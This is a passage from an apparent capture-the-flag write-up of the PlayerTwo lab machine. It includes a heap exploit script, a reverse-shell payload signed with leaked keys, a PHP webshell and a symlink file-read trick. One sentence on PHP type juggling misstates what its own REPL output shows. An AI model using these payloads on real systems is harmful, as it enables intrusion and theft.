    p.sendline(name)
    for i in range(5): 
        p.recvuntil(']: ')
        p.sendline(f'{i}')
    p.recvuntil(']: ')
    p.sendline(f'{dsize}')
    p.recvuntil(']: ')
    p.send(desc)

def del_config(index):
    p.recvuntil('$ ')
    p.sendline('4')
    p.recvuntil(']: ')
    p.sendline(f'{index}')

def print_config(index):
    p.recvuntil('$ ')
    p.sendline('3')
    p.recvuntil(']: ')
    p.sendline(f'{index}')
    res = p.recvuntil('\n\n')
    return res
    
context(arch='amd64')
Protobs = ELF('./Protobs')
libc = ELF('./libc.so.6')

if len(sys.argv) > 1 and sys.argv[1] in ["-remote", "-r"]:
    sshConn = ssh(host='10.10.10.170', user='observer', keyfile='/root/id_rsa_player2_observer')
    p = sshConn.process('/opt/Configuration_Utility/Protobs')
else:
    p = process(Protobs.path) # local

new_config('dummy1', 0x18, 'to be deleted')   # 0
new_config('leak', 0x18, 'to be overwritten') # 1
del_config(0)
new_config(b'A'*0x50 + p64(Protobs.got["free"]), 0x18, 'B'*0x16) # 0
leaked_free = u64(print_config(1)[-8:-2].ljust(8, b"\x00"))
print(f'[+] Leaked free: 0x{leaked_free:x}')
libc_base = leaked_free - libc.sym["free"]
print(f'[+] libc base address: 0x{libc_base:x}')
system_address = libc_base + libc.sym["system"]
print(f'[+] system address: 0x{system_address:x}')
free_hook_address = libc_base + libc.sym["__free_hook"]
print(f'[+] free_hook address: 0x{free_hook_address:x}')

new_config('A'*16, 0x18, 'something')   # 2
new_config('B'*16, 0x18, 'something')   # 3
del_config(3)
del_config(2)
new_config(b'C'*0x20 + p64(free_hook_address), 0x18, 'D'*0x16) #2
new_config('/bin/sh', 0x38, p64(system_address)) # 3

del_config(3)
p.interactive()

```

## Beyond Root

PlayerTwo was so long and complex, there were so many things to dig into after rooting. Here’s the ones I’ll go into:
- Unintended way to read files as root from observer using MQTT.
- Why the signature bypass works.
- Finding the keys and verification code using `gobuster` and signing any binary.
- Uploading a webshell instead of firmware.
- How is the API on 8545 being hosted, and why the PHP file doesn’t show up in `gobuster`.
- Why the PHP type juggling worked to find the OTP backup codes.

### observer root.txt Leak

I know that root is running `/root/broadcast.py` every minute, and I suspect that is to send the file `/home/observer/.ssh/id_rsa` into the MQTT channel. I can test this as observer by changing that file:

```

observer@player2:~/.ssh$ mv id_rsa id_rsa.old
observer@player2:~/.ssh$ echo "0xdf was here" > id_rsa

```

Now with the MQTT script running, it shows up:

![image-20200624081713734](https://0xdfimages.gitlab.io/img/image-20200624081713734.png)

Since I know that root is the one reading the file, I’ll create a symlink to something I want to read, such as `root.txt`:

```

observer@player2:~/.ssh$ rm id_rsa
observer@player2:~/.ssh$ ln -s /root/root.txt id_rsa

```

It works:

![image-20200624081839473](https://0xdfimages.gitlab.io/img/image-20200624081839473.png)

### Signature Bypass

I was surprised when I changed a string in the binary and it didn’t break the signature. This allowed me to get a shell on the system without having to worry about re-signing the binary. Once I got a shell, I had to check out how the page was working.

#### verify.php

When I submit an archive, it’s a POST request to `/protobs/verify.php`:

```

<?php
include("../conn.php");
session_start();
if(!isset($_SESSION['otp']))
{
        header("location: /");
}
else
{
        $filename = $_FILES["firmware"]["name"];
        $uplfile = "uploads/".$filename;
        move_uploaded_file($_FILES["firmware"]["tmp_name"],$uplfile);
        if(file_exists($uplfile))
        {
                $newfile = rand().'.tar';
                rename($uplfile,"uploads/".$newfile);
                $newfile = "uploads/".$newfile;
                $phar = new PharData($newfile);
                $phar->extractTo("uploads/");
                exec('rm uploads/info.txt');
                exec('rm uploads/version');
                exec('rm '.$newfile);
                echo '<script>alert("Verifying signature of the firmware")</script>';
                $efile = rand().'.bin';
                exec('mv uploads/Protobs.bin uploads/'.$efile);
                exec('./verify_signature.py uploads/'.$efile);
                $verified = "uploads/".$efile.".verified";
                if(file_exists($verified))
                {
                        echo '<script>alert("It looks legit. Proceeding for provision test");</script>';
                        exec('chmod +x uploads/'.$efile.'.verified');
                        exec('uploads/'.$efile.'.verified > /dev/null 2>&1 &');
                        exec('rm uploads/*');
                        echo '<script>alert("All checks passed. Firmware is ready for deployment.");window.location="/protobs/";</script>';
                }
                else
                {
                        exec('rm uploads/*');
                        echo '<script>alert("Signature check failed. Stopping provision tests.");window.location="/protobs/";</script>';
                }

        }
}
?>

```

It basically renames the tar to a random name, then extracts the contents to `/uploads/`. It removes `info.txt` and `version`, and then the `tar` archive. Next it pops the message box about verifying the signature.

It then moves `Protobs.bin` to a random name, and runs `verify_signature.py [random.bin]`. It then checks for a file with the same name with `.verified` appended. If that exists, it prints the next msgbox, makes it executable, and runs it. Then, either way, it removes all files in `/uploads/`.

To be successful, `verify_signature.py` must create a file with the same name as the input with `.verified` appended.

#### verify\_signature.py

This script does the actual verification:

```

#!/usr/bin/env python3

import argparse
import nacl.encoding
import nacl.signing
import os
import sys

parser = argparse.ArgumentParser()
parser.add_argument('--key', help='location of verifying key file, default ./keys/verify')
parser.add_argument('file', nargs='+', help='files to verify')
args = parser.parse_args()

if args.key == None:
    args.key = os.path.dirname(os.path.realpath(__file__)) + "/keys/verify"

verify_key_f = os.open(args.key, os.O_RDONLY)
verify_key_hex = os.read(verify_key_f, 64)
os.close(verify_key_f)

verify_key = nacl.signing.VerifyKey(verify_key_hex, encoder=nacl.encoding.HexEncoder)

for arg in args.file:
    f = open(arg, "rb")
    verified = verify_key.verify(f.read(8414))
    unverified = f.read()
    f.close()

    f = open(arg + ".verified", "wb")
    f.write(verified+unverified)
    f.close()

```

It’s using the [nacl library](https://pynacl.readthedocs.io/en/stable/signing/) to check signing. It reads the first 8414 bytes of the file into `verified`, and checks that with the key. If that call to `verify` fails, it will raise a `nacl.exceptions.BadSignatureError`, which will exit the program. Otherwise, it returns the binary without the signature, and that plus any bytes after 8414 are appended and written to `.verified`. So if the signature is valid, then `.verified` is written.

#### 8414

So why only check 8414 bytes? This could be a nod to the idea with some firmware that only certain sections of the binary are checked. For this binary, it’s conveniently chosen such that it stops just before the strings:

![image-20200210204453311](https://0xdfimages.gitlab.io/img/image-20200210204453311.png)

### Find Keys and Algorithm

#### Find Keys (and Source, Kind Of)

Once I got a shell and was looking at how the signing check was performed, I also noticed that the Python script that did the verification was in the web directory:

```

www-data@player2:/var/www/product/protobs$ ls
gen_firm_keys.py  pihsm                      uploads
index.php         protobs_firmware_v1.0.tar  verify.php
keys              sign_firm.py               verify_signature.py

```

I wondered how far I could get had I spent time crawling the site.

With `gobuster` and the cookie for a valid session, I can find the `keys` folder:

```

root@kali# gobuster dir -u http://product.player2.htb/protobs/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -c "PHPSESSID=g4k24vb7hec723sh4uhf874qdq" -t 40 -x php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://product.player2.htb/protobs/
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] Cookies:        PHPSESSID=g4k24vb7hec723sh4uhf874qdq
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/02/10 06:27:56 Starting gobuster
===============================================================
/uploads (Status: 301)
/index (Status: 200)
/index.php (Status: 200)
/keys (Status: 301)
===============================================================
2020/02/10 06:29:45 Finished
===============================================================

```

In it, I can find `sign` and `verify`:

```

root@kali# gobuster dir -u http://product.player2.htb/protobs/keys -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -c "PHPSESSID=g4k24vb7hec723sh4uhf874qdq" -t 40
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://product.player2.htb/protobs/keys
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] Cookies:        PHPSESSID=g4k24vb7hec723sh4uhf874qdq
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/02/10 06:48:12 Starting gobuster
===============================================================
/sign (Status: 200)
/verify (Status: 200)
===============================================================
2020/02/10 06:48:59 Finished
===============================================================

```

I can download them:

```

root@kali# cat verify 
a7bbbbd96903bcbae931e41727c33e94dac13957843dbe167dd8af21876f5baa
root@kali# cat sign 
58c848f2f024148b4535adb5aafcaa6645a448fca2c788dcb116e7a8b5398ecf

```

If I had enough background in firmware signing and how it is done, this might be enough for me to create a binary and sign it. That would work provided that the binary was less than 8414 bytes (otherwise I’d have to guess how much of the file to use to create the signature).

But I can go one step further. Unfortunately, `verify_signature` isn’t in any of the wordlists that I typically use to brute force websites. Additionally, it don’t typically brute force for `.py` files. But, if I did have a list with `verify_signature` and brute for `.py`, I would find it:

```

root@kali# echo verify_signature > test 
root@kali# gobuster dir -u http://product.player2.htb/protobs/ -w test -c "PHPSESSID=g4k24vb7hec723sh4uhf874qdq" -t 40 -x py
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://product.player2.htb/protobs/
[+] Threads:        40
[+] Wordlist:       test
[+] Status codes:   200,204,301,302,307,401,403
[+] Cookies:        PHPSESSID=g4k24vb7hec723sh4uhf874qdq
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     py
[+] Timeout:        10s
===============================================================
2020/02/10 06:53:48 Starting gobuster
===============================================================
/verify_signature.py (Status: 200)
===============================================================
2020/02/10 06:53:48 Finished
===============================================================

```

Since the server isn’t treating Python as code, it returns the plain text (just the head shown here as the full script is above):

```

root@kali# curl -s http://product.player2.htb/protobs/verify_signature.py | head
#!/usr/bin/env python3

import argparse
import nacl.encoding
import nacl.signing
import os
import sys

parser = argparse.ArgumentParser()
parser.add_argument('--key', help='location of verifying key file, default ./keys/verify')

```

#### Sign Any Elf

Once I have that, I could see that it’s only signing based on the first 8414 bytes, and I have both keys, so I could sign my own binary. I’ll generate a reverse shell binary with `msfvenom`:

```

root@kali# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=443 -f elf > rev.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes

```

Now, I’ll go into the Python interpreter and see if I can sign that. First, I’ll read the sigining key and create a `SigningKey` object:

```

root@kali# python3
Python 3.7.5 (default, Oct 27 2019, 15:43:29) 
[GCC 9.2.1 20191022] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import nacl.signing
>>> import nacl.encoding
>>> with open('sign', 'r') as f:
...     sign_key_hex = f.read()
... 
>>> len(sign_key_hex)
64
>>> sign_key = nacl.signing.SigningKey(sign_key_hex, nacl.encoding.HexEncoder)

```

Now I’ll read in the binary in two pieces, just like in the verify code:

```

>>> with open('rev.elf', 'rb') as f:
...     elf_varified = f.read(8414)
...     elf_unvarified = f.read()
... 

```

Now, I’ll sign the verified part:

```

>>> elf_signed = sign_key.sign(elf_varified, nacl.encoding.RawEncoder)
>>> len(elf_signed)
258
>>> len(elf_varified)
194

```

I can see the result is 64 bytes longer. I’ll just combine that with the unverified section, and write it out:

```

>>> with open('signed_elf', 'wb') as f:
...     f.write(elf_signed)
...     f.write(elf_unvarified)
... 
258
0

```

If I run the verification script on the file, it does create the `.verified` file:

```

root@kali# python3 verify_signature.py --key verify signed_elf 
root@kali# ls *.verified
signed_elf.verified

```

To take it one last step, I can put this into a tar archive:

```

root@kali# tar zcf rev_shell.tar info.txt Protobs.bin version

```

And upload it to the site. I get a callback and a shell:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.170.
Ncat: Connection from 10.10.10.170:58676.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

#### Summary

Given that I was able to get the keys from the server pretty easily, if I knew to guess that they were nacl, I could have signed any arbitrary binary. Also, with enough brute forcing, I could have potentially found the verification Python script as well, and then I definitely have enough to sign a binary. But even without the script, the only things missing were the algorithm and the amount of the file that’s signed. And given that most shell payloads will come in way less than 8414 bytes, I really only need to guess the algorithm.

### Webshell Upload

This is an unintended method to get code execution without modifying the firmware, but instead uploading a webshell.

`verify.php` renames the uploaded `.tar` archive and unpacks it into the `uploads` directory:

```

$newfile = rand().'.tar';
rename($uplfile,"uploads/".$newfile);
$newfile = "uploads/".$newfile;
$phar = new PharData($newfile);
$phar->extractTo("uploads/");

```

Later, after verifying the signature and potentially running an executable, it cleans up:

```

exec('rm uploads/*');

```

The problem here is that it doesn’t `rm -rf`, so if there’s a directory inside `uploads`, it isn’t deleted.

This allows me to upload a webshell inside an archive. For example, I’ll create an archive with a folder with a webshell:

```

root@kali# mkdir 0xdf
root@kali# cp /opt/shells/php/cmd.php 0xdf/
root@kali# cat 0xdf/cmd.php 
<?php system($_REQUEST["cmd"]); ?>
root@kali# tar zcf webshell.tar 0xdf/

```

Now I’ll upload that to the server. The pop-ups show that I was rejected, but the webshell was not cleaned up:

```

root@kali# curl http://product.player2.htb/protobs/uploads/0xdf/cmd.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

### server.php

I was checking out the apache configs for the site, and I noticed something odd in `/etc/apache2/sites-enabled/000-default.conf` (comments removed):

```

<VirtualHost *:80>
        DocumentRoot /var/www/html
</VirtualHost>
<VirtualHost *:80>

        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/main
        ServerName player2.htb

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
<VirtualHost *:80>
        ServerName product.player2.htb
        DocumentRoot /var/www/product
</VirtualHost>

```

This config shows three virtual hosts, all listening on 80. That matches [my initial enumeration](#recon) for the [error page when visiting the IP](#website---tcp-80), the [player2.htb virtual host](#player2htb---tcp-80), and the [product.player2.htb virtual host](#productplayer2htb---tcp-80), but doesn’t explain what is serving the [API running on port 8545](#twirp-api---tcp-8545), which must be running with something besides apache.

Later, when [running pspy](https://github.com/DominicBreuker/pspy), I noticed there was a cron running `/bin/dash -p -c sudo -u egre55 -s /bin/sh -c "/usr/bin/php -S 0.0.0.0:8545 /var/www/main/server.php"` . Typically I see Apache or NGINX configured to pass requests for PHP scripts to PHP, but in this case, `php` is running the script, with `-S` which the [docs say] is:

> ```

>   -S <addr>:<port> Run with built-in web server.
>
> ```

That’s fine, but as `server.php` is also sitting in a directory hosted by Apache, and Apache is processing PHP scripts (like for `index.php`), can I access the API on port 80 at `server.php`? Turns out I can:

```

root@kali# curl 10.10.10.170:8545
{"code":"bad_route","msg":"no handler for path \"\/\"","meta":{"twirp_invalid_route":"GET \/"}}

root@kali# curl player2.htb/server.php
{"code":"bad_route","msg":"no handler for path \"\/server.php\"","meta":{"twirp_invalid_route":"GET \/server.php"}}

```

Now I don’t know that I can actually get data out of it (having `server.php` in the path seems to mess things up), but my real question was, why did I not find this in my `gobuster`? The command I had run was:

```

gobuster dir -u http://player2.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 40 -o scans/gobuster-80-player2-root-php

```

First I checked that `server` was in the wordlist (I would have been *shocked* if it wasn’t):

```

root@kali# grep -E "^server$" /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
server

```

`curl -v` shows why `gobuster` didn’t find it. The API returns 404 when you don’t query it correctly:

```

root@kali# curl -v http://player2.htb/server.php
*   Trying 10.10.10.170:80...
* TCP_NODELAY set
* Connected to player2.htb (10.10.10.170) port 80 (#0)
> GET /server.php HTTP/1.1
> Host: player2.htb
> User-Agent: curl/7.67.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 404 Not Found
< Date: Thu, 23 Jan 2020 11:17:14 GMT
< Server: Apache/2.4.29 (Ubuntu)
< Content-Length: 115
< Content-Type: application/json
< 
* Connection #0 to host player2.htb left intact
{"code":"bad_route","msg":"no handler for path \"\/server.php\"","meta":{"twirp_invalid_route":"GET \/server.php"}}

```

This behavior is the same when hitting 8545.

### PHP Type Juggling

I was able to find the backup codes by sending a payload of `0` to the system. Why did that work?

Here’s the PHP code that runs the API:

```

if($_POST['action']!="backup_codes")
{
    $obj->error = "Missing parameters";
    header("Content-Type: application/json");
    echo json_encode($obj);
}
else
{
    $stmt = $conn->prepare("select username,code from users where username=?");
    $stmt->bind_param('s',$_SESSION['username']);
    $stmt->execute();
    $stmt->store_result();
    $stmt->bind_result($name,$code);
    $stmt->fetch();
    $obj->user = $name;
    $obj->code = $code;
    header("Content-Type: application/json");
    echo json_encode($obj);
}

```

So what I need is for `$_POST['action']!="backup_codes"` to return false. This seems like a good time to play with the PHP repl (`php -a`).

The intended case works, the right string gives “yay” and another string gives “boo”:

```

php > $input = "backup_codes";
php > if ($input!="backup_codes"){ echo "boo";} else {echo "yay";}
yay
php > $input = "backup_codesa";
php > if ($input!="backup_codes"){ echo "boo";} else {echo "yay";}
boo

```

The trick here is how PHP will try to play friendly when an int is sent. It turns out that `0` will return not equal to any string, and `1` will return equal to any string:

```

php > $input = 0;
php > if ($input!="backup_codes"){ echo "boo";} else {echo "yay";}
yay
php > $input = 1;
php > if ($input!="backup_codes"){ echo "boo";} else {echo "yay";}
boo

```

The solution here is to use `===` and `!==` instead of `==` and `!=`, as the first two require that the type is the same as well.